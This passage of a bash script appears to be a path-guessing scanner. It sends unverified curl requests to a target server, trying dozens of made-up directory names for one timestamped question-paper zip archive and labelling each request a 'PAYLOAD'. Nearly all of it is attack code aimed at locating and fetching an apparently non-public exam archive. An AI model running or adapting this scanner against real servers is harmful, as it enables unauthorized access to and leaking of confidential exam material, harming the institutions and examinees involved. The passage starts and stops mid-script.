payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSyncQPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSyncQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSyncQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperPanel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ToolQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ToolQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ToolQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperAutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolQPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterHandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorHandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperCloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ControlQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ControlQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperMonitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload_QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [OpsQPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}OpsQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}OpsQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUploadQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUploadQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUploadQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_Transfer/QP19_02_2025%2001_16_01.zip]:"
